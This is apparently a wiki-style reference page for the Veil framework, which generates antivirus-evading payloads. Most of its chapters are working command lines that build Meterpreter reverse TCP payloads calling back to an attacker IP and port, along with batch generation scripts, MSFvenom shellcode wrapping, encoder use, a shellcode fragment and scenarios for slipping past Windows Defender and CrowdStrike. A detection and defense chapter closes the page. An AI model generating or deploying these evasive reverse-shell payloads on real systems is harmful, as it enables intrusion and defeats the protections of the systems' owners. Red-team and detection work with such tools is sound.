---
title: "Veil"
tool_name: "veil"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Intermediate"
platform: "Linux"
language: "Python, Go, Ruby"
license: "GPL-3.0"
repository: "https://github.com/veil-framework/veil"
kali_package: "veil"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "av-evasion"
  - "payload-generation"
  - "metasploit"
  - "shellcode"
date_created: "2013-01-10"
last_updated: "2020-04-23"
author: "ChrisTruncer"
---

# Veil — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

Veil is a framework for generating payloads that bypass common antivirus solutions. It achieves this by leveraging multiple programming languages and obfuscation techniques to produce Metasploit-compatible payloads that avoid signature-based detection.

### Framework Architecture

Veil consists of two primary tools:

- **Veil-Evasion**: The core AV evasion tool. Generates payloads in Python, Go, C, Ruby, and PowerShell that wrap Meterpreter or custom shellcode. Each payload uses different obfuscation strategies — import manipulation, entropy randomization, code transformation — to produce unique binary outputs.
- **Veil-Ordnance**: A standalone shellcode generator and encoder. Produces raw shellcode for reverse shells and bind shells, with support for bad character avoidance and multiple encoding passes.

### How AV Evasion Works

Traditional AV relies heavily on signature matching. Veil defeats this by:

1. **Language diversity**: Python, Go, and PowerShell payloads look nothing like typical Metasploit output.
2. **Randomized imports**: Payload modules dynamically resolve Windows API calls at runtime.
3. **Code transformation**: Each generation produces structurally different source code.
4. **Encryption layers**: Shellcode is XOR-encrypted within the payload wrapper.
5. **Entropy manipulation**: Output binaries have natural-looking entropy profiles.

### Compatibility

Veil outputs Metasploit-compatible payloads and handler resource scripts. Every generated payload includes an `.rc` file that configures a matching Metasploit handler.

---

## Chapter 2: Installation & Setup

### Kali Linux Quick Install

```bash
sudo apt -y install veil
```

**Explanation:** Installs Veil and all dependencies from the Kali repository.

### Post-Install Setup

Veil requires a setup script to configure the WINE environment (for Python compilation via Py2Exe) and download dependencies:

```bash
/usr/share/veil/config/setup.sh --force --silent
```

**Explanation:** Runs the setup script in silent mode, automatically installing WINE, Python, Ruby, Go, and compilation tools.

**Practical caveat:** The setup process downloads approximately 500MB of WINE dependencies and Python packages. It takes 10-30 minutes depending on network speed. If the setup fails, rerun with `--force` to overwrite partial installations.

### Verify Installation

```bash
./Veil.py --version
```

Expected output:

```
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================
```

### Configuration Issues

If Veil reports "0 payloads loaded" on startup:

```bash
cd /usr/share/veil/config/
sudo ./update-config.py
```

**Explanation:** Regenerates the configuration file that tells Veil where to find its payload modules and output directories.

---

## Chapter 3: Basic Usage

### Launching Veil

```bash
./Veil.py
```

Main menu:

```
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================

Main Menu

  2 tools loaded

Available Tools:

  1)  Evasion
  2)  Ordnance

Available Commands:

  exit      Completely exit Veil
  info      Information on a specific tool
  list      List available tools
  options   Show Veil configuration
  update    Update Veil
  use       Use a specific tool

Veil>:
```

### Listing Payloads

```bash
./Veil.py --list-payloads
```

**Explanation:** Lists all available Veil-Evasion payload modules organized by language.

### Generating a Go-Based Reverse TCP Payload

```bash
./Veil.py -t Evasion \
  -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 \
  --port 4444
```

**Explanation:** Generates a Go-based Meterpreter reverse TCP payload that compiles to a Windows executable, targeting 192.168.1.100:4444.

Output:

```
===============================================================================
                                   Veil-Evasion
===============================================================================

 [*] Language: go
 [*] Payload Module: go/meterpreter/rev_tcp
 [*] Executable written to: /var/lib/veil/output/compiled/payload.exe
 [*] Source code written to: /var/lib/veil/output/source/payload.go
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
```

### Generating a Python-Based Reverse TCP Payload

```bash
./Veil.py -t Evasion \
  -p python/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 \
  --port 4444 \
  --compiler pyinstaller
```

**Explanation:** Creates a Python Meterpreter payload compiled to an executable using PyInstaller.

### Veil-Ordnance: Raw Shellcode Generation

```bash
./Veil.py -t Ordnance \
  --ordnance-payload rev_tcp \
  --ip 192.168.1.100 \
  --port 4444
```

**Explanation:** Generates raw x86 reverse TCP shellcode via Veil-Ordnance, producing 287 bytes of position-independent code.

Output:

```
===============================================================================
                                   Veil-Ordnance
===============================================================================

 [*] Payload Name: Reverse TCP Stager (Stage 1)
 [*] IP Address: 192.168.1.100
 [*] Port: 4444
 [*] Shellcode Size: 287

\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64...
```

### Complete Flags Reference

**Veil-Evasion Options:**

| Flag | Description |
|------|-------------|
| **-t** | Tool to use (`Evasion`, `Ordnance`) |
| **-p** | Payload module (e.g., `go/meterpreter/rev_tcp.py`) |
| **-o** | Output file base name |
| **--ip** | Callback IP address |
| **--domain** | Alternative for IP (for domain callbacks) |
| **--port** | Callback port |
| **-c** | Custom payload module options |
| **--msfoptions** | Options for the MSF payload |
| **--msfvenom** | Generate MSFvenom shellcode inline |
| **--compiler** | Compiler option (pyinstaller, py2exe) |
| **--clean** | Clean output folders |

**Veil-Ordnance Options:**

| Flag | Description |
|------|-------------|
| **--ordnance-payload** | Payload type (rev_tcp, bind_tcp) |
| **-e** | Encoder to use |
| **-b** | Bad characters to avoid |
| **--list-encoders** | List available encoders |
| **--print-stats** | Show encoded shellcode statistics |

---

## Chapter 4: Intermediate Usage

### Tool Chaining

#### Veil Payload → Metasploit Handler

```bash
# Generate the payload
./Veil.py -t Evasion \
  -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 \
  --port 4444 \
  -o my_payload

# Launch Metasploit handler using the generated .rc file
msfconsole -q -r /var/lib/veil/output/handlers/my_payload.rc
```

**Explanation:** Veil automatically generates a Metasploit resource script that configures the matching handler — no manual setup needed.

#### Veil-Ordnance Shellcode → Custom Loader

```bash
# Generate shellcode
./Veil.py -t Ordnance \
  --ordnance-payload rev_tcp \
  --ip 192.168.1.100 \
  --port 4444 \
  --print-stats

# Save to file for use with Shellter, BDF, or custom loaders
# Copy the shellcode from output and convert to raw binary
```

**Explanation:** Veil-Ordnance produces shellcode that integrates with injection tools like Shellter for PE infection.

### Batch Payload Generation

```bash
#!/bin/bash
# Generate payloads for all supported languages
for payload in \
  "go/meterpreter/rev_tcp.py" \
  "python/meterpreter/rev_tcp.py" \
  "c/meterpreter/rev_http.py" \
  "powershell/meterpreter/rev_tcp.py" \
  "ruby/meterpreter/rev_tcp.py"
do
  name=$(echo "$payload" | tr '/' '_')
  ./Veil.py -t Evasion \
    -p "$payload" \
    --ip 192.168.1.100 \
    --port 4444 \
    -o "batch_${name}"
done
```

**Explanation:** Iterates through payload types, generating one executable per language for comprehensive AV testing.

### Available Payload Languages

| Language | Module Example | Compiled As | Evasion Characteristics |
|----------|---------------|-------------|------------------------|
| **Go** | `go/meterpreter/rev_tcp.py` | Native EXE | Statically compiled, no runtime deps |
| **Python** | `python/meterpreter/rev_tcp.py` | EXE via PyInstaller | Obfuscated Python bytecode |
| **C** | `c/meterpreter/rev_http.py` | EXE via MinGW | Direct API calls, minimal footprint |
| **Ruby** | `ruby/meterpreter/rev_tcp.py` | EXE via OCRA | Mixed interpretation |
| **PowerShell** | `powershell/meterpreter/rev_tcp.py` | PS1 / EXE | AMSI-aware evasion |

---

## Chapter 5: Advanced Usage

### Custom Payload Creation

Veil-Evasion payloads follow a modular structure. Creating a custom payload involves:

1. Copy an existing payload module as a template
2. Modify the shellcode injection method
3. Change the obfuscation technique
4. Test against target AV

```bash
# Navigate to payload modules
ls /usr/share/veil/payloads/

# Copy a Go template
cp /usr/share/veil/payloads/go/meterpreter/rev_tcp.py \
   /usr/share/veil/payloads/go/meterpreter/my_custom.py
```

**Explanation:** Veil's modular architecture allows custom payload creation by modifying existing templates.

### Evasion Techniques Deep Dive

#### Import Randomization

Veil payloads randomize which Windows API functions they import. Standard Meterpreter uses predictable imports like `LoadLibraryA` and `GetProcAddress`. Veil resolves these dynamically:

```python
# Veil's approach (conceptual)
kernel32 = ctypes.windll.kernel32
loadlib = kernel32.LoadLibraryA  # resolved at runtime
```

**Explanation:** By resolving API calls at runtime rather than using the import table, Veil payloads avoid static import analysis by AV.

#### Entropy Randomization

Each payload generation produces different entropy profiles. The encrypted shellcode, randomized variable names, and shuffled code paths create unique binary signatures.

#### Code Transformation

Veil applies multiple transformations:
- Variable name randomization
- Code block reordering
- Dead code insertion
- String encryption
- Control flow obfuscation

### MSFvenom Integration

```bash
# Use MSFvenom shellcode within Veil
./Veil.py -t Evasion \
  -p c/shellcode_inject/virtual_alloc.py \
  --msfvenom windows/meterpreter/reverse_tcp \
  --ip 192.168.1.100 \
  --port 4444
```

**Explanation:** Veil can wrap MSFvenom-generated shellcode in its obfuscation framework, combining MSFvenom's payload variety with Veil's evasion capabilities.

### Ordnance Encoder Options

```bash
# List available encoders
./Veil.py -t Ordnance --list-encoders

# Generate with specific encoder
./Veil.py -t Ordnance \
  --ordnance-payload rev_tcp \
  --ip 192.168.1.100 \
  --port 4444 \
  -e shikata_ga_nai \
  -b '\x00\x0a' \
  --print-stats
```

**Explanation:** Veil-Ordnance supports encoding with multiple algorithms to avoid bad characters and evade signatures.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF — Bypassing AV on a Windows Target

During a CTF competition, the target machine ran Windows Defender. Metasploit payloads were immediately quarantined upon delivery.

```bash
# Generate a Go-based payload (Go binaries are harder to analyze)
./Veil.py -t Evasion \
  -p go/meterpreter/rev_tcp.py \
  --ip 10.10.14.5 \
  --port 4444 \
  -o ctf_payload

# The Go payload was uploaded to the target
# Defender did not flag it during the CTF window
```

**Explanation:** Go-compiled Veil payloads produce statically-linked binaries with natural-looking entropy, making them harder for signature-based AV to classify.

### Scenario 2: Red Team — Multi-Language Payload Delivery

A red team engagement required payloads that bypassed a CrowdStrike Falcon deployment. The team generated payloads across multiple languages to test which evaded detection:

```bash
# Generate payloads in all available languages
./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 -o go_rev
./Veil.py -t Evasion -p c/meterpreter/rev_http.py \
  --ip 192.168.1.100 --port 4444 -o c_rev
./Veil.py -t Evasion -p powershell/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 -o ps_rev
```

**Explanation:** Testing multiple payload languages identifies which evasion path succeeds against the specific AV vendor's detection logic.

### Scenario 3: Purple Team — Validating Veil Detection Rules

The blue team needed to validate that their detection pipeline caught Veil-generated payloads:

```bash
# Generate fresh payloads with different configurations
for i in $(seq 1 10); do
  ./Veil.py -t Evasion \
    -p python/meterpreter/rev_tcp.py \
    --ip 192.168.1.100 --port 4444 \
    -o "test_$(date +%s)_${i}" 2>/dev/null
done

# Submit all samples to the SOC for detection analysis
```

**Explanation:** Generating multiple unique samples tests whether the detection pipeline catches Veil payloads generically or only specific known variants.

---

## Chapter 7: Detection & Defense

### Veil Payload Signatures

Known Veil detection indicators:

- **Go payloads**: Specific Go runtime initialization patterns, characteristic string encryption
- **Python payloads**: PyInstaller stub patterns, Python bytecode markers
- **PowerShell payloads**: AMSI bypass patterns, specific string obfuscation
- **Shellcode patterns**: Ordnance-generated shellcode has known decoder stubs

### Behavioral Detection

EDR products detect Veil through:

- **Process creation chains**: MSBuild.exe or csc.exe spawning unexpected child processes (for C payloads)
- **Memory allocation**: VirtualAlloc with RWX permissions in non-standard processes
- **Network callbacks**: Outbound connections from unusual processes on port 4444 or custom ports
- **PowerShell logging**: ScriptBlock Logging captures obfuscated PowerShell payloads

### Defensive Countermeasures

1. **Enable AMSI** for PowerShell payload detection
2. **Deploy EDR** with behavioral analysis capabilities
3. **Monitor** `VirtualAlloc` and `VirtualProtect` calls with RWX permissions
4. **Block** known Veil compilation artifacts at email gateways
5. **Implement** application whitelisting to prevent unauthorized executables
6. **Monitor** Go binary execution from unusual parent processes
7. **Enable** Sysmon with rules targeting Veil-specific behaviors

---

## Chapter 8: Troubleshooting

### "0 Payloads Loaded"

**Cause:** Configuration file is missing or incorrect.

```bash
cd /usr/share/veil/config/
sudo ./update-config.py
```

**Explanation:** Regenerates the Veil settings file that maps payload modules to their paths.

### WINE Setup Fails

**Cause:** Missing 32-bit WINE support or X server issues.

```bash
dpkg --add-architecture i386
sudo apt update
sudo apt -y install wine32 wine64
```

**Explanation:** Veil requires 32-bit WINE for Py2Exe compilation. Install both 32-bit and 64-bit WINE packages.

### Go Compilation Errors

**Cause:** Go compiler not installed or misconfigured.

```bash
sudo apt -y install golang
export PATH=$PATH:/usr/local/go/bin
```

**Explanation:** Go payloads require the Go compiler. Ensure it is installed and in the system PATH.

### PyInstaller Build Fails

**Cause:** WINE Python environment is corrupted.

```bash
# Rebuild the WINE environment
cd /usr/share/veil/
./config/setup.sh --force
```

**Explanation:** Reruns the full setup process, rebuilding the WINE Python environment from scratch.

### Output Binary Flagged Immediately

**Cause:** AV signature matches the payload template.

**Solution:** Switch to a different payload language (Go instead of Python), reduce the payload size, or combine Veil output with MSFvenom encoding:

```bash
./Veil.py -t Evasion \
  -p c/shellcode_inject/virtual_alloc.py \
  --msfvenom "windows/meterpreter/reverse_tcp" \
  --ip 192.168.1.100 --port 4444
```

**Explanation:** Using C-based payloads with inline MSFvenom shellcode produces different binary signatures than the default Go or Python templates.

---

## Resources

### Official Resources

- [Veil Framework Website](https://www.veil-framework.com/) — Official documentation and updates
- [Veil GitHub Repository](https://github.com/veil-framework/Veil) — Source code and issues
- [Veil Wiki](https://github.com/veil-framework/Veil/wiki) — Community documentation

### Evasion Research

- [AV Evasion via Python](https://www.veil-framework.com/wiki/wiki/usage/payloads/) — Veil payload documentation
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — MSFvenom reference
- [Red Team Notes](https://book.hacktricks.xyz/) — AV evasion techniques

### Learning Resources

- [OffSec PEN-200](https://www.offsec.com/courses/pen-200/) — OSCP course with evasion modules
- [PentesterLab](https://pentesterlab.com/) — Hands-on AV evasion exercises
- [HackTheBox](https://www.hackthebox.com/) — Practice environments

### Veil Framework Architecture

Veil's modular architecture separates concerns cleanly:

```
Veil Framework
├── Veil-Evasion (AV bypass payloads)
│   ├── go/ (Go-based payloads)
│   ├── python/ (Python-based payloads)
│   ├── c/ (C-based payloads)
│   ├── ruby/ (Ruby-based payloads)
│   └── powershell/ (PowerShell payloads)
├── Veil-Ordnance (shellcode generator)
│   ├── Payloads (rev_tcp, bind_tcp, etc.)
│   └── Encoders (shikata_ga_nai, etc.)
└── Config
    ├── settings.py (environment config)
    └── setup.sh (dependency installer)
```

### Veil vs MSFvenom Evasion Comparison

| Factor | Veil | MSFvenom |
|--------|------|----------|
| Language diversity | Go, Python, C, Ruby, PS | Single binary format |
| Evasion technique | Language-based obfuscation | Encoding (shikata_ga_nai) |
| Output size | Larger (includes runtime) | Smaller (raw shellcode) |
| Evasion longevity | Longer (varied signatures) | Shorter (known encoders) |
| Setup complexity | WINE + dependencies | Built into Metasploit |
| Maintenance | Archived (Jan 2024) | Actively maintained |

Veil was archived in January 2024 but remains in Kali Linux. Its techniques are still valid, but new payload modules are unlikely. For ongoing AV evasion, consider combining Veil's approach with custom encoding.
